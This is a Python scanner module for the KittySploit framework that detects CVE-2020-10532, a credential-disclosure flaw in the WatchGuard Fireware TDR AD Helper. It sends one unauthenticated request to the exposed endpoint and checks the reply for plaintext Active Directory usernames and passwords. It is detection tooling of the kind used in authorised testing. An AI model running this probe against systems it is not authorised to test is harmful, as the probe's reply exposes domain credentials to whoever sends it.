#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WatchGuard Fireware Threat Detection and Response (TDR) service contains a credential-disclosure vulnerability."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WatchGuard Fireware AD Helper Component - Credentials Disclosure Detection',
        'description': 'WatchGuard Fireware Threat Detection and Response (TDR) service contains a credential-disclosure vulnerability in the AD Helper component that allows unauthenticated attackers to gain Active Directory credentials for a Windows domain in plaintext.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'watchguard', 'disclosure', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2020-10532',
            'https://www.exploit-db.com/exploits/48203',
            'https://www.watchguard.com/wgrd-blog/tdr-ad-helper-credential-disclosure-vulnerability',
        ],
        'cve': 'CVE-2020-10532',
    }

    def run(self):
        r = self.http_request(method="GET", path='/rest/domains/list?sortCol=fullyQualifiedName&sortDir=asc', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('"fullyQualifiedName"', '"logonDomain"', '"username"', '"password"',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="WatchGuard Fireware AD Helper Component - Credentials Disclosure detected",
                path='/rest/domains/list?sortCol=fullyQualifiedName&sortDir=asc',
            )
            return True
        return False

